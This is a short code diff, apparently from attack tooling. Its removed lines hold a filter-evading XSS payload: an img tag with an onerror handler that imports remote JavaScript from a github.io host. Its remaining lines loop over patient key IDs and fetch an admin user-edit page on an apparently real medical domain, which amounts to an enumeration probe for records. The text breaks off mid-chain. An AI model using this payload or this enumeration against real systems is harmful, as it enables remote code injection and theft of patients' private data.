@@ -1,8 +1,3 @@
-%uff1cimg%20src=d%20onerror=import("https://tomoncrss.github.io/jsfile/payload.js")%uff1e
-
-
-
-
 for (let i = 199300; i <= 199301; i++) {
   fetch(`https://pateng.erad.com/Admin/AdminUsers/Edit?aPatientKey=${i}`)
     .then(res => res.text())
